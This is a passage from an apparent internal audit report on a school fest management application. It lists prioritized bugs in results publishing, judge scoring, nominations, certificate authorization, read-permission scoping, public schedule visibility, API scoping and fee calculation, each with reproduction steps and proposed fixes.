**Tests.** No existing test covers `FestScheduleConflictService` at all. **Scope:** small. **Dependencies:** none.

---

#### `Marks EVT-01` — Results can be published with zero marks entered — the default configuration for every new event
**P1 · confirmed · Audit 1 §6.5.** Tenant: any · Actors: Sahodaya Admin (Results page); also backs the phased-regional-billing publish path; a weaker parallel exists at State · Event types: all Sahodaya-level FestEvent types; state_fest_events · Phase: result publication.
**Expected → Actual.** Publishing overall results should require marks actually entered, mirroring the unconditional per-item completeness check in `FestItemResultsService::assertCanPublish()`. `EventLifecycleGate::allowPublishResults()` only calls the completeness/judge-score checks when `require_all_marks_before_publish`/`require_judge_scores_before_publish` are `true` — both default `false`. `StateEventLifecycleGate::allowPublishResults()` has no marks-check at all, optional or otherwise.
**Reproduction & evidence.** Seeded event (`status=ongoing`, both flags at real defaults), 1 approved performer, 0 `FestMark` rows: POST publish → 302, no errors, `results_published=true`, `status='completed'`, `FestMark::count()=0`. Re-run with the flag `true` correctly 422'd. `EventLifecycleGate.php:236-247`; `FestJudgeGateService.php:16-20`; migration defaults confirmed `false`; `FestItemResultsService.php:167-185` (item-level check IS unconditional, by contrast).
**Impact.** An admin can publish an entire fest's results — visible to every school and the public — before any judging has happened, with one click and no warning, because this is the default configuration, not an opt-in misconfiguration.
**Fix.** Make the marks-completeness check unconditional at the hub level too, or default `require_all_marks_before_publish` to `true` for new events and show an explicit low-marks confirmation regardless of the flags.
**Tests.** No committed test covers hub-level `publish()` under default flags with zero marks. **Scope:** medium. **Dependencies:** interacts with `Marks EVT-04` (disqualification blocking) below — fix both together, since defaulting the flag to `true` makes `EVT-04`'s bug more likely to trigger, not less.

---

#### `Marks EVT-02` — Judge-panel score subtotals have no upper bound anywhere in the stack
**P1 · confirmed · Audit 1 §6.5.** Tenant: any · Actors: Sahodaya Admin Mark Entry (judge-panel flow) · Phase: judge score entry (multi-judge panel items).
**Expected → Actual.** A judge's entered subtotal should be bounded, the way the sibling method `saveParticipantScores()` already clamps to `[0, max_score]`. The only *live* save path, `FestMarkCriteriaService::saveParticipantJudgeScores()`, stores raw input with no upper bound; controller validation is `'judge_scores.*' => 'nullable|numeric|min:0'`, no max. The correctly-clamping sibling method is dead code — never called anywhere.
**Reproduction & evidence.** Item with `mark_judge_count=2`, one criterion `max_score=10`. POST `judge_scores={1:9999,2:5000}` → 302, no validation errors, `FestMark.score` persisted as exactly 14999.00. `FestMarkCriteriaService.php:62-80` vs. `:137-155`.
**Impact.** A typo or bad-faith entry in a judge's online subtotal is not caught anywhere in the stack, silently corrupting that participant's score, item ranking, championship points, and school totals with no error surfaced.
**Fix.** Add a `max:` rule to `judge_scores.*` (sum of the item's criteria `max_score`, or a sane default) and/or clamp inside `saveParticipantJudgeScores()`.
**Tests.** No `FestMarkCriteriaServiceTest` file exists anywhere. **Scope:** small. **Dependencies:** none.

---

#### `Marks EVT-04` — A single disqualification can permanently block hub-level publish under the strict completeness flag
**P1 · confirmed · Audit 1 §6.5.** Tenant: any · Actors: Sahodaya Admin Results, after a disqualification · Phase: publish interacting with disqualification.
**Expected → Actual.** A disqualified participant should be excluded from the "has everyone been marked" completeness check, matching the always-on item-level gate. `EventLifecycleGate::assertAllParticipantsMarked()` counts every approved performer toward the required-count denominator with no `disqualified_at` filter, while `FestMarkSaveService::save()` unconditionally refuses to save a mark for a disqualified participant. Combined: once any approved performer is disqualified, the hub-level publish gate becomes permanently unsatisfiable while `require_all_marks_before_publish` is on.
**Reproduction & evidence.** Event with the flag on, performers A (clean) and B (disqualified): marking B → 422 (correct); marking A → succeeds; publishing → still 422s, "Mark entry incomplete," despite every legally-markable participant being marked. `EventLifecycleGate.php:264-291` vs. `FestEventReportAnalyticsService.php:708` (which correctly excludes disqualified rows elsewhere).
**Impact.** A routine, legitimate action (disqualifying a participant for misconduct) permanently locks a Sahodaya out of publishing that event's results through the normal flow — and this precondition becomes *more* likely if `Marks EVT-01`'s own recommendation (default the flag to `true`) is adopted without this fix landing first.
**Fix.** Add `whereNull('disqualified_at')` to `assertAllParticipantsMarked()`'s participant-count query.
**Tests.** No existing test covers disqualification interacting with `require_all_marks_before_publish`. **Scope:** small. **Dependencies:** must land alongside or before `Marks EVT-01`.

---

#### `QUAL-01` — Manual State nominations are never verified against a real, certified result
**P1 · confirmed · Audit 1 §6.6.** Tenant: any with `state_program_id` set · Actors: Sahodaya Admin (and any broad role passing `sahodaya.admin` middleware) · Event types: kalolsavam / any FestEvent linked to a State program · Phase: Sahodaya-to-State manual nomination.
**Expected → Actual.** A nomination selection should only ever represent a real, certified result — verified against an actual `FestMark` belonging to the hub event's candidate pool. `FestStateNominationService::select()`'s only checks are: batch not certified, primary quota count, and "this `mark_id` not already selected" (skipped entirely when `mark_id` is omitted). `create()` writes every field directly from caller-supplied data with zero lookup against `FestMark`/`FestRegistration`/`FestParticipant`. A migration comment references a `backfillFromCandidate()` method that does not exist anywhere in `app/`.
**Reproduction & evidence.** POST select with entirely fictitious `mark_id`/`school_id`/`student_name`/`source_position`/`grade`/`score` (zero real `FestMark`/`FestRegistration`/`FestParticipant` rows exist for the event) → accepted, `status='selected'`, persisted with the fabricated fields intact. `FestStateNominationService.php:111-178`; `FestStateNominationController.php:60-79,88-95`; `FestStateQualifierPayloadBuilder.php:46-92` (certified selections flow to State unmodified).
**Impact.** Any authenticated Sahodaya-scoped admin/staff can nominate a fictitious or non-qualifying student as a State-level qualifier, or overwrite a real winner's position/grade/score, entirely bypassing the maker/checker control whose stated purpose is to prevent exactly this.
**Fix.** In `select()`, when `mark_id`/`registration_id`/`participant_id` is present, look up the real record server-side (scoped to this hub event or its partition children) and derive all fields from it; reject if no matching certified result is found. Add real FKs or a service-level existence check.
**Tests.** Add a test asserting `select()` throws when given a `mark_id` that doesn't exist, doesn't belong to the hub event's candidate pool, or whose supplied fields don't match the real mark. **Scope:** medium. **Dependencies:** none.

---

#### `CERT-01` — Certificate collection resolves the target record by ID alone, ignoring entity type
**P1 · confirmed · Audit 1 §6.7.** Tenant: any (worse under shared-DB, degrades to same-tenant under production's DB-per-Sahodaya) · Actors: Sahodaya Admin · Event types: entity-type agnostic — Fest participants, volunteer/staff duty certificates, and (shared table) Training/Board-Results certificate IDs if passed here · Phase: certificate collection (physical hand-off tracking).
**Expected → Actual.** The single-certificate "mark as collected" action should only mutate a certificate belonging to the calling admin's own tenant, for any `entity_type`, matching the sibling `bulkCollect()`'s pattern in the same controller. `FestCertificateOpsController::collect()` does `FestParticipant::find($certificate->entity_id)` and authorizes against that participant's event/tenant **without ever checking `$certificate->entity_type`**; `Certificate` has no FK/global scope, so `entity_id` is only meaningful relative to `entity_type`. `bulkCollect()` correctly filters `entity_type=FestParticipant::class` first — `collect()` doesn't.
**Reproduction & evidence.** Tenant B certificate with `entity_type=FestVolunteer::class`; Tenant A has an unrelated `FestParticipant` whose id collides with that certificate's `entity_id`. Tenant A's admin POSTs collect scoped to their own tenant → 302 success, Tenant B's certificate mutated (`collected_at`/`collected_by` set). `FestCertificateOpsController.php:100-114` vs. `:116-137`.
**Impact.** Under production's documented DB-per-Sahodaya isolation, this degrades from cross-tenant to a same-tenant data-integrity bug (an admin could mis-mark their own non-participant certificate as collected via an ID coincidence); under any shared/single-database mode it is a genuine cross-tenant unauthorized write. Either way the authorization logic itself is wrong.
**Fix.** Add an `entity_type` guard before the `FestParticipant::find()` call in `collect()`, mirroring `bulkCollect()`.
**Tests.** Promote a permanent cross-tenant/cross-entity-type collect test. **Scope:** small. **Dependencies:** none.

---

#### `CERT-02` + `SEC-04[Lifecycle]` — Disqualification and results-unpublish never revoke a participant's stale winner certificate or qualification
**P1 · confirmed (merged, see §1.3) · Audit 1 §6.7 + Audit 3 §4.** Tenant: any · Actors: Sahodaya Admin (disqualify, unpublish); downstream State staff (act on stale qualifications) · Event types: kalolsavam and other non-phased base flow (certificate half); any event (qualification half) · Phase: post-results correction — appeals-driven disqualification, or unpublish-correct-republish.
**Expected → Actual.** When a participant's placement/eligibility changes after certificates/qualifications were issued, the now-incorrect artifacts should be invalidated. `FestCertificateService` has no delete/revoke/invalidate method anywhere in its 432 lines — genuinely absent for certificates. For qualifications, the picture is narrower: `FestQualificationService` *does* have working `revokeQualification()`/`revokeQualificationsForRegistration()` methods, wired into registration cancel/reject/bulk-reject plus a manual admin action — but neither `FestAppealController::disqualify()` nor the `unpublish()`-correct-republish cycle ever calls this already-existing capability. `SEC-04[Lifecycle]` independently rediscovered the unpublish half and added a further detail: `promoteWinners()`'s `results_published` guard is not universal — it only applies inside the `usesPhasedRegionalBilling()` branch, so for a plain event `promoteWinners()` has no `results_published` check at all.
**Reproduction & evidence.** Winner certificate + qualification issued for a top-mark participant, then the ordinary `participants.disqualify` route called on that participant: disqualify succeeds; both the original certificate and qualification survive completely untouched. `FestCertificateService.php` (full read, no revoke method); `FestAppealController::disqualify()` (lines 94-113, no Certificate/Qualification touch); `FestResultsController.php:269-318` (`unpublish()`, both branches, zero `FestQualification` code); `FestQualificationService.php:281-318,342-356` (the existing, correctly-working revoke methods, re-confirmed via `FestQualificationRevocationOnRejectTest`, 2/2 passed).
**Impact.** A demoted/disqualified participant keeps a fully valid, publicly printable "winner" certificate and remains promoted/registered at the next level, with zero system-visible flag, reachable via the completely ordinary appeals workflow. State-level staff can make decisions based on qualification data the originating Sahodaya has explicitly retracted, with no signal the source was unpublished.
**Fix.** For qualifications: wire the already-existing `revokeQualification()` into `FestAppealController::disqualify()` and the unpublish-correct-republish path — reuses proven, tested code. Also add a `results_published` guard to `promoteWinners()` for plain (non-phased) events. For certificates: add a genuinely new revoke/invalidate method to `FestCertificateService` (e.g. an `invalidated_at` column checked by public verify/print) and call it from the same two call sites; alternatively have `collectWinnerRows()` cross-check each source event's live `results_published` flag.
**Tests.** Promote the disqualify-leaves-stale-cert/qualification test; add a corresponding unpublish-correct-republish test. **Scope:** medium. **Dependencies:** the certificate half needs a new schema field (`invalidated_at` or similar) — coordinate with `TECH-09[TechAudit]`'s FK work if both land near each other.

---

#### `CERT-03` — Public certificate verification likely never resolves the correct per-Sahodaya database
**P1 · likely (not independently executable in this sandbox — see §1.5) · Audit 1 §6.7.** Tenant: any Sahodaya running its own dedicated production database · Actors: public/anonymous · Event types: Fest winner/participation/record-break and Training-program certificates (generic `Certificate` branch); MCQ and Board-Results Topper certificates unaffected · Phase: public certificate verification (QR/link).
**Expected → Actual.** Scanning a certificate's QR/verify link should resolve against that certificate's own Sahodaya database, as the same controller already does correctly for MCQ/Topper certificates. `certificates.verify`/`print` routes carry no `{tenantId}` segment — in contrast to the same file's `display.show` route, which explicitly adds `InitializeTenancyByRouteTenant`. `PublicCertificateController`'s generic `Certificate::where('verification_uuid',...)` calls have no tenant-DB resolution, unlike `findMcqCertificate()`/`findTopperCertificate()`, which loop every active Sahodaya when tenancy isn't initialized. The `certificates` table migration lives exclusively under `database/migrations/tenant/`, so a plain `php artisan migrate` never creates it on the central connection — the realistic failure mode is an unhandled "relation does not exist" exception, not a graceful "invalid certificate" page.
**Reproduction.** Not independently executable — `phpunit.xml` forces `TENANCY_DATABASE_PER_SAHODAYA=false`, structurally disabling the exact DB-switching mechanism this bug depends on.
**Evidence.** `routes/web.php:1797-1807` (no tenant param) vs. `:1811` (`display.show`, has it); `bootstrap/app.php:37-40`; `InitializeTenancyByRouteTenant::resolveTenant()` (49-64, route-params only); `PublicCertificateController` (generic lookups at 29,72 vs. `findMcqCertificate()`/`findTopperCertificate()` at 165-269); `config/tenancy.php:217-219`.
**Impact.** Public verification/print would fail — likely via a hard exception — for Fest and Training certificates once a Sahodaya runs on its own dedicated database, while MCQ/Topper keep working; would surface as hard-to-reproduce "certificate won't verify" complaints in production while looking fine in any single-DB dev/staging/test setup.
**Fix.** Give the generic Certificate lookup in `verify()`/`print()` the same TenancyDatabase-scanning loop already implemented for `findMcqCertificate()`/`findTopperCertificate()`, or encode a tenant hint in the verification URL/QR payload.
**Tests.** Cannot be closed without a second real database in the test environment. **Scope:** medium. **Dependencies:** shares the `TIF-01`/`SA-03`/`TECH-02[TechAudit]` sandbox-limitation cluster (§1.5).

---

#### `DATA-01` — Registering a 2nd team/pair/trio within quota fails (Postgres) or silently overwrites the 1st roster (any driver)
**P1 · confirmed · Audit 1 §6.8.** Tenant: any (team/group half is Postgres-production-only; pair/trio half reproduces on every driver including the SQLite test suite) · Actors: School Admin/coordinator (registering a 2nd team/pair/trio); Sahodaya Admin (configured `max_teams`) · Event types: kalolsavam, sports, kids-fest, teacher-fest, english-fest, science-fest · Phase: school registration for group/team and pair/trio items, 2nd entry.
**Expected → Actual.** When `max_teams` (e.g. 2) allows more than one team/pair/trio per school, a 2nd registration with a different roster should succeed as a distinct entry. Two distinct bugs: **(1) team/group:** `createForSchool()` has no existing-registration lookup before INSERT, so a 2nd registration proceeds straight to `create()`. On Postgres this collides with a partial unique index `fest_reg_active_unique(event_id,school_id,item_id)` that has no awareness of `max_teams`, failing with the misleading "Your school already has an entry for this item" even though the app-layer quota check had already approved it; the index is driver-gated and invisible to SQLite tests. **(2) pair/trio — more severe:** because the `$isGroup` flag only covers `('group','team')`, a pair/trio registration falls into the "individual" branch, which looks up any existing registration for the same (event,school,item) and, if found, silently calls `updateForSchool()` on it instead of creating a new one — no error, no warning, roster silently replaced.
**Reproduction & evidence.** Team/group (Postgres-only, reproduced via a leftover untracked test): Team 1 succeeds; Team 2 (within quota) throws a real unique-constraint violation. Pair/trio (reproduced on plain SQLite via a scratch test): registering Pair 1 (students A,B) succeeds; registering Pair 2 (students C,D) via the same form returns success but is the *same* registration row, now holding C,D — A,B silently removed. `2026_07_06_160002_erp_tenant_scale_indexes.php:24-31` (driver-gated index); `FestParticipationLimitService.php:149-167,204-221`; `HandlesFestRegistrationDuplicates.php:18-25` (converts the Postgres violation into the misleading message).
**Impact.** Team/group: schools are blocked from a paid, UI-exposed, actively-validated feature with a confusing error, in production only. Pair/trio: a school registering a legitimate 2nd pair/trio gets no error at all — the system reports success while silently discarding the first roster, on every database driver including the test suite's own.
**Fix.** (a) Team/group: scope the partial index to exclude `('team','group')` and enforce uniqueness via `FestParticipationLimitService`'s `max_teams` check instead, or make the migration driver-symmetric. (b) Pair/trio: align `$isGroup`'s gate with `FestTeamSquadRules::isMultiPerson()`/`FestEventItem::isTeamItem()` (which already include pair/trio).
**Tests.** None found repo-wide for either failure mode. **Scope:** medium. **Dependencies:** shares root-cause code area with `CS-01` (both stem from the same hardcoded `['group','team']` pattern excluding pair/trio) — fix together.

---

#### `UI-School EVT-01` — Substitution requests are missing the partition-scope guard the sibling clash-request flow already has
**P1 · confirmed · Audit 1 §6.9.** Tenant: any phase- or region-partitioned · Actors: School Admin/`school_event_coordinator`/any school role reaching Substitution Requests · Event types: any fest program under phase-based or region-partitioned conduct · Phase: fest-day substitution.
**Expected → Actual.** Like its sibling `FestClashRequestController`, `FestSubstitutionRequestController::index()`/`store()` should call `FestRegistrationRouterService::assertSchoolCanAccess()` before reading/writing, so a school can only act against its own assigned region/phase child. Instead only a same-tenant `abort_if` exists — no `assertSchoolCanAccess` anywhere in the file; the sibling controller (identical shape otherwise) does call it. A code comment in `FestSubstitutionReviewController` claiming requests are "stored against the school's actual region/finale child event" is confirmed false.
**Reproduction & evidence.** Region-partitioned hub, school assigned to child A only, POSTs to `.../events/{hubId-or-childB-id}/substitution-requests` → no abort, row persists with that `event_id`; the identical request to `.../clash-requests` on the same ids does abort (422 hub / 403 childB) because that controller calls the guard. `FestSubstitutionRequestController.php:19,59` vs. `FestClashRequestController.php:21-26,74`.
**Impact.** A school's legitimate last-minute substitution request, submitted while viewing the hub or a sibling region's child event, gets persisted under the wrong `event_id` and can go silently invisible to a region-scoped reviewer's queue — the school sees "submitted successfully" with no error. Does not let a school read another school's data (queries stay `school_id`-filtered) — the exposure is the silent-misrouting workflow bug plus minor exposure of the target event's basic metadata.
**Fix.** Add `assertSchoolCanAccess($event, $this->school->id)` to both `index()` and `store()`, mirroring `FestClashRequestController` exactly.
**Tests.** None found for `FestSubstitutionRequestController`, `FestClashRequestController`, or `assertSchoolCanAccess` anywhere. **Scope:** small. **Dependencies:** add one shared regression test exercising both controllers so they can't drift apart again.

---

#### `NAV-SEC-01` — Every non-event-scoped Sahodaya Admin read page is fully readable regardless of event/permission scope
**P1 · confirmed · Audit 1 §6.10.** Tenant: any · Actors: `event_admin`, `region_admin`, and 8 other narrower roles in `TenantUserCatalog::sahodayaPermissionRoles()` (certificate_collector, data_entry, mark_entry_admin, registration_coordinator, sahodaya_finance, event_coordinator, training_admin, sahodaya_staff) · Phase: cross-cutting READ authorization — Schools & Membership, Queues & Verification, Finance hub/ledger/payables, Settings → Portal users, Login audit, Board Results verification.
**Expected → Actual.** `EnsureSahodayaAdmin`'s own comment states scoped roles get "a full sahodaya-admin experience, but locked to the specific events they've been assigned." `SahodayaAdminController`'s permission check only runs on non-GET requests — every read action on all 126 of the 127 files extending it skips the permission check entirely. `StudentProfileController::show()` and `TenantUserController::index()` have zero permission-check calls at all, unlike their own sibling write actions in the same files.
**Reproduction & evidence.** `event_admin` with the default permission set, scoped to one event via `FestEventStaff`: GET the student-profile route for an unrelated student at an unrelated school → 200 with `parent_phone`/`address` present exactly as stored; GET the tenant-user-list route → 200 listing the full roster. POST `sahodaya.schools.approve` by the same account correctly returned 403, confirming the gap is specifically read-side. `StudentProfileController.php:15-37`; `TenantUserController.php:23-90`. The identical write-only gate pattern exists in `SchoolAdminController` too.
**Impact.** A narrowly-scoped fest volunteer/coordinator account can read individual students' PII (phone, address, blood group, notes), every portal user's role/permission/event/exam assignments, and — by the same pattern applying to all 126 controllers — tenant finance/login-audit pages, none of which relate to the one event they were actually scoped to.
**Fix.** Extend the permission check to also run on GET requests wherever the write-permission map resolves a permission for that path; at minimum add explicit guards to `StudentProfileController::show/showPhoto`, `TenantUserController::index`, and the Payable/BankReconciliation/LoginAudit/UnifiedPayments index actions first.
**Tests.** No existing test references either the students-show or users-index route names anywhere. **Scope:** large (structural fix across 126 controllers, though the recommended minimal-first-pass targets the highest-risk 4-5). **Dependencies:** shares the "manual, per-controller check" structural root cause with `Event-ops EVT-01`, `SA-01`, `SEC-01[Lifecycle]` — see §2.3.

---

#### `PUB-01` — Participant lookup leaks scheduled time and stage before `schedule_published`
**P1 · confirmed · Audit 1 §6.12.** Tenant: any · Actors: public visitor (unauthenticated) · Event types: all reachable via public participant lookup · Phase: pre-publication (`schedule_published=false`).
**Expected → Actual.** A participant's performance time/stage/queue order must stay hidden until schedule is explicitly published, as `schedule()`/`itemSchedule()` already enforce and as `FestPublicVisibilityService::showSchedulePublicly()` was written to check. `formatPublicParticipant()` unconditionally returns `scheduled_at`/`stage`/`sort_order` from any `FestSchedule` row, with zero `schedule_published` check; `FestPortalController::participant()` passes it straight through. `showSchedulePublicly()` has zero callers — dead code.
**Reproduction & evidence.** District-level (strict-anonymity) event, `schedule_published=false`, one approved participant with a chest number and schedule row: public schedule page → 404 (correctly hidden); public participant-by-chest-number page → 200, body contains stage name and time. `FestPublicVisibilityService.php:126-153,160-163`; `FestPortalController.php:608-624` vs. `:268,287`.
**Impact.** Reveals competitively/logistically sensitive timing and stage assignment before intended publish, defeating the module's own "chest-only until results" anonymity design. Low attacker effort: chest numbers are small sequential integers every participant already knows their own; `participant()` has no restriction to the caller's own reference.
**Fix.** Gate `scheduled_at`/`stage`/`sort_order` in `formatPublicParticipant()` behind `schedule_published` — wire in the existing but unused `showSchedulePublicly()` helper.
**Tests.** No existing test references `FestPortalController::participant()` or `search()` at all. **Scope:** small. **Dependencies:** none; related to `SEC-02[Lifecycle]` (records/live leak) — same theme, fix together.

---

#### `API-01` — The Sahodaya API event-list endpoint ignores event/region scoping entirely
**P1 · confirmed · Audit 1 §6.12.** Tenant: any · Actors: `event_admin`/`region_admin` via API client · Phase: event listing.
**Expected → Actual.** A scoped role should see only their assigned event(s) via the API, matching the web UI. `EventsApiController::index()` runs `FestEvent::forTenant($id)->get()` with zero `eventAdminEventIds` filtering; the web `FestEventController` applies this scoping correctly in both `index()`/`programIndex()`. `EnsureSahodayaAdminApi` *does* set the `eventAdminEventIds` attribute — the middleware does its job; the controller ignores the result. Root cause: the API's GET route has no `{event}` segment, so `EventRegionAdminScope::resolveRouteEventId()` never denies the GET request, which passes cleanly into a controller that then ignores the scope it was handed.
**Reproduction & evidence.** Tenant with Events A, B; `event_admin` scoped to A only. Web `sahodaya.events.index` → only A. Same user, API `GET /api/v1/sahodaya/{tenantId}/events` → both A and B. `EventsApiController.php:11-19`; `FestEventController.php:49-51,121-123`; `EnsureSahodayaAdminApi.php:58-69`; `EventRegionAdminScope.php:81-91`.
**Impact.** A role the Sahodaya deliberately scoped to a subset of events/regions can enumerate every fest event the Sahodaya runs (titles, item/registration counts, status, dates) via the API, contradicting both the web UI and the platform's access model. Not a cross-tenant leak — still bounded by the Sahodaya's own id.
**Fix.** Add the same `eventAdminEventIds` scoping to `EventsApiController::index()` that `FestEventController::index()`/`programIndex()` already apply.
**Tests.** `RegionScopedAccessParityTest` covers only the single-event GET show route — zero coverage of the LIST route. **Scope:** small. **Dependencies:** none.

---

#### `PHASE-02` — Item registration-window resolution is not phase-aware
**P1 · confirmed · Audit 2 §1.** Tenant: any using named competition phases · Actors: School Admin (registration) · Event types: any with `phase_id`-scoped items · Phase: item registration-window resolution.
**Expected → Actual.** `FestItemWindowResolver` should account for the item's phase window. It never references `FestEventPhase`/`phase_id` anywhere — it falls back through item → head → event → area windows with zero phase awareness, and can wrongly block a phase-open item or wrongly clear an item on a phase-closed one.
**Evidence.** `FestItemWindowResolver` (full class, no `FestEventPhase` reference).
**Impact.** A phase's own registration window is silently irrelevant to whether an item under it can actually be registered for — the wrong window (event-level or head-level) governs instead.
**Fix.** Make `FestItemWindowResolver` phase-aware, or route `FestItemRegistrationGate` through phase-aware logic first.
**Tests.** Item under an open phase with a divergent, closed head/area window still registers successfully — currently zero coverage. **Scope:** medium. **Dependencies:** shares root cause and fix window with `PHASE-01`.

---

#### `PHASE-03` + `SEC-05[Lifecycle]` — `phase_mode_enabled` has no public-visibility or report-export awareness
**P1 · confirmed (merged, see §1.3) · Audit 2 §1 + Audit 3 §4.** Tenant: any using named competition phases without regional billing · Actors: public visitor; Sahodaya/region-admin staff (report export) · Event types: `phase_mode_enabled` events (non-regional-billing) · Phase: results/report publication, public visibility.
**Expected → Actual.** Publishing one competition phase should not expose another, unpublished phase's data. `phase_mode_enabled`'s per-phase `results_published` toggle is accepted by the update endpoint but is inert: public visibility (`FestPublicVisibilityService`, `FestPortalController`, `PublicFestScoreboardService`) has zero concept of `phase_mode_enabled` or per-item competition phase (`grep -c phase_mode_enabled` = 0 across all three); `EventLifecycleGate::currentReportPhase()`/`allowedReportPhases()` key purely on event-wide flags. The only phase-aware publication mechanism that exists (`FestPhasePublicationService`) is explicitly restricted to the structurally distinct phased-regional-billing mechanism and refuses to run otherwise. So for a `phase_mode_enabled` event there is exactly one on/off switch covering every item regardless of phase. Report export additionally has a sequencing bug: the event-wide `enforceReportLifecyclePhase()` 403s **before** the phase-specific carve-out check is ever reached.
**Evidence.** `EventLifecycleGate.php:96-119,121-128`; `FestPublicVisibilityService.php:52-94`; `FestPhasePublicationService.php:81` (`abort_unless(...usesPhasedRegionalBilling()...)`); `FestReportController.php:846` (unconditional gate) vs. `:853-861` (unreachable carve-out); `docs/REGION_PHASE_EVENT_REPORTING_REMEDIATION_PLAN.md:63` — independently re-located and confirmed to exist as cited: *"G7 | fest_event_phases lifecycle columns and phase_mode_enabled exist, but registration, food, scheduling, marks, results, certificates, promotion, reports, and public pages do not enforce them. | Named phases are labels only."* — a known, documented, still-open gap in the codebase's own remediation plan.
**Impact.** Breaks the phase-by-phase reveal model a `phase_mode_enabled` event is presumably configured for; also blocks a legitimate, code-documented early-per-phase-export workflow for staff.
**Fix.** Extend `FestPublicVisibilityService`/`PublicFestScoreboardService`/`FestPortalController`'s query scoping to check each item's own competition-phase `results_published` state via `FestPhaseLifecycleService::effectiveLifecycleForItem()` when `phase_mode_enabled` is true. Separately, evaluate the phase-specific export check before the event-wide `enforceReportLifecyclePhase()` call, or teach `allowedReportPhases()` to accept an optional `competition_phase_id`.
**Tests.** Publish one phase's results (non-regional-billing, `phase_mode_enabled`) and verify public visibility/report access is scoped to that phase alone — currently zero coverage. **Scope:** medium–large (spans 3 public-facing services plus the export controller). **Dependencies:** shares theme with `PHASE-01`/`PHASE-02`.

---

#### `FEE-03[Financial]` — Phase-level cancellation has no cascade at all
**P1 · confirmed · Audit 2 §9c.** Tenant: any · Actors: Sahodaya Admin (or anyone with `fest.manage` permission reaching the API route) · Event types: any with named phases · Phase: phase-level cancellation.
**Expected → Actual.** Cancelling a phase should withdraw its registrations and recalculate/credit fees, mirroring event-level cancellation's intent. `FestEventPhaseController::quickStatus()` → `transitionStatus()` does `$phase->update(['status' => 'cancelled'])` and nothing else — no registration withdrawal, no fee recalculation, no credit.
**Evidence.** `FestEventPhaseController.php` (`transitionStatus()`, single-field update, no cascade). Reachable today via a real authenticated API route (`fest.manage` permission) even though no admin screen currently exposes a phase-level cancel control.
**Impact.** A phase-level cancellation silently leaves registrations active and fees unadjusted — a live, reachable data-integrity gap even without a UI trigger, since the API route exists regardless.
**Fix.** Extend phase-level cancellation with the same cascade event-level cancellation is meant to have (once `EVT-01[Event setup]`/`FEE-01[Financial]` is fixed, reuse the same pattern).
**Tests.** Phase-level cancellation cascade, once built — currently zero coverage. **Scope:** medium. **Dependencies:** should reuse whatever pattern fixes `EVT-01[Event setup]`/`FEE-01[Financial]`/`FEE-02[Financial]`.

---

#### `KOCHI-02` — `kalolsavam_composite` bills a group/team item as N individual registrations instead of one team charge
**P1 · confirmed · Audit 2 §9d.** Tenant: Kochi Metro (not a live tenant — §7); any tenant using `kalolsavam_composite` with group/team items · Actors: Sahodaya Admin (fee configuration); School Admin (billed) · Event types: `kalolsavam_composite`-billed events · Phase: fee computation for group items.
**Expected → Actual.** A multi-member group/team entry should bill one team-level charge, matching the two sibling methods (`calculateForEvent`, `calculateForHead`), which both correctly skip-then-separately-bill team items. `calculate()` has no team/group-item billing branch at all — a 3-member group entry is billed as 3 independent individual registrations.
**Reproduction & evidence.** 3-member group item, per-student rate ₹100: expected 1 team-level charge; actual `student_registration_fee`=₹300 (3× the per-participant rate).
**Impact.** Kochi Metro's own stated per-student rate compounds into a 3× (or N×) overbilling for every group/team entry under this fee model.
**Fix.** Route `calculate()`'s team/group items through the same skip-then-separate-bill pattern its sibling methods already use.
**Tests.** Kochi Metro: multi-member group item bills a single team charge, not per-participant — **CRITICAL**, currently zero coverage. **Scope:** small. **Dependencies:** none.

---

#### `MLB-01` — No fee model can express Malabar's stated combined student-count-slab + flat-per-student rule
**P1 · confirmed · Audit 2 §9d.** Tenant: Malabar (not a live tenant — §7) · Actors: Sahodaya Admin (fee configuration) · Event types: any wanting a combined slab+flat rule · Phase: school fee calculation.
**Expected → Actual.** Malabar's stated rule (stepped base fee by student-count slab, plus a flat per-student add-on) should be configurable. No `fee_model` in the catalog can express this — `student_count_slab` and `per_student` are mutually exclusive branches of the same `match()` statement; nothing sums them. Configuring either alone under-bills by 21–78% depending on student count.
**Reproduction & evidence.** 49 students, brief's combined total = ₹28,050. Slab alone → ₹6,000 (−22,050 short). Flat alone → ₹22,050 (−6,000 short, i.e. the entire slab base missing). `FestSchoolEventFeeService::recalculate()` dispatch (lines 948-984) → either `studentCountSlabFee()` (407-429) **or** the `per_student` match arm (~1027).
**Impact.** No configuration of the existing catalog reaches Malabar's stated total — a genuine capability gap, not a configuration mistake. Blocks Malabar onboarding entirely until built.
**Fix.** Build a combined `fee_model` (product decision — see §17); likely buildable entirely against the existing `fee_settings` JSON column, since the gap is in dispatch logic, not schema.
**Tests.** `recalculate()` output when both `student_count_slabs` and `per_student_amount` are configured together, once the combined model exists — **CRITICAL**, blocks Malabar entirely until built. **Scope:** medium (new dispatch branch, no migration needed). **Dependencies:** product decision required first — §17.1.

---

#### `FEE-03[Precedence]` — `school_fee_cap`/`school_fee_min` silently has no effect for 3 of 4 billing paths
**P1 · confirmed · Audit 2 §3, §9e.** Tenant: any using sports, per-head, or per-phase billing · Actors: Sahodaya Admin (configures the cap/floor, expecting protection) · Event types: sports-billed, per-head-billed, per-phase-billed events · Phase: fee finalization.
**Expected → Actual.** The one Sahodaya-configurable safety rail against an unexpectedly large bill should apply uniformly. `school_fee_cap`/`school_fee_min` is applied ONLY on the plain (non-sports, non-per-head, non-per-phase) `recalculate()` branch — `recalculateForSportsEvent()`, `recalculateForHead()`, and `recalculateForPhase()` never call either helper.
**Reproduction & evidence.** Cap configured at ₹1,000; phase-billed subtotal of ₹7,000 (phase share ₹2,000 + item override ₹5,000): expected total_due=₹1,000 (capped); actual total_due=₹7,000, cap ignored entirely.
**Impact.** A Sahodaya's own configured safety rail against runaway bills is invisible for the majority of billing paths, defeating its purpose exactly when it would matter most (sports events, per-head events, per-phase events — all more complex, higher-total scenarios than the plain path).
**Fix.** Apply `school_fee_cap`/`school_fee_min` uniformly across all four recalculation methods.
**Tests.** `school_fee_cap`/`school_fee_min` applied for sports/per-head/per-phase billing, not just the plain path — **CRITICAL**, currently zero coverage on 3 of 4 paths. **Scope:** medium. **Dependencies:** shares code area with `FEE-01[Snapshot]`'s fix (all four `recalculate*()` methods) — coordinate.

---

#### `FEE-05[Precedence]` — Itemized invoice lines are populated for only 2 of 9 fee models
**P1 · confirmed · Audit 2 §3, §9e.** Tenant: any using the 7 unpopulated fee models · Actors: Sahodaya Admin/finance (relies on the itemized ledger) · Event types: any not using `sports_composite`/`kalolsavam_composite` · Phase: invoice line-item persistence.
